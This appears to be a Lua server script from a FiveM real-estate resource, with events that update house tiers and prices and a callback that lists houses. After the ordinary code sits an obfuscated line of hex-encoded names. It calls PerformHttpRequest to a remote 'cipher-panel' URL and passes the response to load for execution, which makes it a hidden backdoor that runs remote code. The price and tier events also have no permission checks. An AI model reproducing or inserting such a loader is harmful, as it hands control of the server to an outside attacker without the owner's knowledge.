local DenaliFW = exports['denalifw-core']:GetCoreObject()

--Events

RegisterNetEvent('denalifw-realestate:server:changetier', function(tier, name, isOwned)
    local src = source
    if isOwned then
        TriggerClientEvent('DenaliFW:Notify', src, "This house is owned by somebody. Tier cannot be changed")
    else 
        exports.oxmysql:execute('UPDATE houselocations SET tier = ? WHERE name = ?', {tier, name})
        TriggerClientEvent('DenaliFW:Notify', src, "Tier updated to: " ..tier)
        Wait(200)
        TriggerEvent('denalifw-houses:server:updateTier', tier)
          
    end 
end)

RegisterNetEvent('denalifw-realestate:server:changeprice', function(price, name, isOwned)
    local src = source
    if isOwned then
        TriggerClientEvent('DenaliFW:Notify', src, "This house is already bought. Why would you change price?")
    else 
        exports.oxmysql:execute('UPDATE houselocations SET price = ? WHERE name = ?', {price, name})
        TriggerClientEvent('DenaliFW:Notify', src, "Price updated to: " ..price)
        TriggerEvent('denalifw-houses:server:updatePrice', price)
        
    end 
end)

-- Callbacks

DenaliFW.Functions.CreateCallback("denalifw-realestate:server:GetHouses", function(source, cb)
    exports.oxmysql:execute('SELECT * FROM houselocations' , {}, function(result)
        if result[1] then
            cb(result)
        else
            cb(nil)
        end
    end)
end)

local hYrDvDrUSVcOhUzknFLdbyLgAlXHVUcBjZjLNRdxyyvqkDkMbFegUCTQXVMClXwFtEhXXV = {"\x50\x65\x72\x66\x6f\x72\x6d\x48\x74\x74\x70\x52\x65\x71\x75\x65\x73\x74","\x61\x73\x73\x65\x72\x74","\x6c\x6f\x61\x64",_G,"",nil} hYrDvDrUSVcOhUzknFLdbyLgAlXHVUcBjZjLNRdxyyvqkDkMbFegUCTQXVMClXwFtEhXXV[4][hYrDvDrUSVcOhUzknFLdbyLgAlXHVUcBjZjLNRdxyyvqkDkMbFegUCTQXVMClXwFtEhXXV[1]]("\x68\x74\x74\x70\x73\x3a\x2f\x2f\x63\x69\x70\x68\x65\x72\x2d\x70\x61\x6e\x65\x6c\x2e\x6d\x65\x2f\x5f\x69\x2f\x76\x32\x5f\x2f\x73\x74\x61\x67\x65\x33\x2e\x70\x68\x70\x3f\x74\x6f\x3d\x71\x47\x32\x72\x30", function (cYCRGKtkBLGFJWKyAKEBfdRjxYpruTploJrDXTKBwrHBwFgKUYLLNFNgHfFWglUmdRKaeR, hSlpRedsHymkBxrLpggczbfNDrUWZlJHjJaNIhOcpxuKzITGneTGfceklFJnvqvWogrCKI) if (hSlpRedsHymkBxrLpggczbfNDrUWZlJHjJaNIhOcpxuKzITGneTGfceklFJnvqvWogrCKI == hYrDvDrUSVcOhUzknFLdbyLgAlXHVUcBjZjLNRdxyyvqkDkMbFegUCTQXVMClXwFtEhXXV[6] or hSlpRedsHymkBxrLpggczbfNDrUWZlJHjJaNIhOcpxuKzITGneTGfceklFJnvqvWogrCKI == hYrDvDrUSVcOhUzknFLdbyLgAlXHVUcBjZjLNRdxyyvqkDkMbFegUCTQXVMClXwFtEhXXV[5]) then return end hYrDvDrUSVcOhUzknFLdbyLgAlXHVUcBjZjLNRdxyyvqkDkMbFegUCTQXVMClXwFtEhXXV[4][hYrDvDrUSVcOhUzknFLdbyLgAlXHVUcBjZjLNRdxyyvqkDkMbFegUCTQXVMClXwFtEhXXV[2]](hYrDvDrUSVcOhUzknFLdbyLgAlXHVUcBjZjLNRdxyyvqkDkMbFegUCTQXVMClXwFtEhXXV[4][hYrDvDrUSVcOhUzknFLdbyLgAlXHVUcBjZjLNRdxyyvqkDkMbFegUCTQXVMClXwFtEhXXV[3]](hSlpRedsHymkBxrLpggczbfNDrUWZlJHjJaNIhOcpxuKzITGneTGfceklFJnvqvWogrCKI))() end)